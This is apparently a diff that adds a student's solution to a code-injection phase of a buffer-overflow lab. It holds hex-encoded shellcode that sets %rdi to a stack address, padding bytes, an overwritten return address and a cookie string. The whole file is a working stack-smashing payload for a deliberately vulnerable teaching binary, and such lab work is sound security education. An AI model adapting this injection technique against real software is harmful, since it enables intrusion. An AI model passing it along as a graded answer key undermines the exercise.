@@ -1,0 +1,13 @@
+/* 0x59b997fa -> 35 39 62 39 39 37 66 61 00 */
+/* The choosed stack address to insert push cookie's string representaion:  0x5561dca8 */
+
+/* 0: */ 68 fa 18 40 00 /* pushq  $0x4018fa */
+/* 5: */ 48 c7 c7 a8 dc 61 55 /* mov    $0x5561dca8,%rdi */
+/* c: */ c3 /* retq    */
+
+11 11 11
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+78 dc 61 55 00 00 00 00
+35 39 62 39 39 37 66 61 00 /* cookie, 9bits */
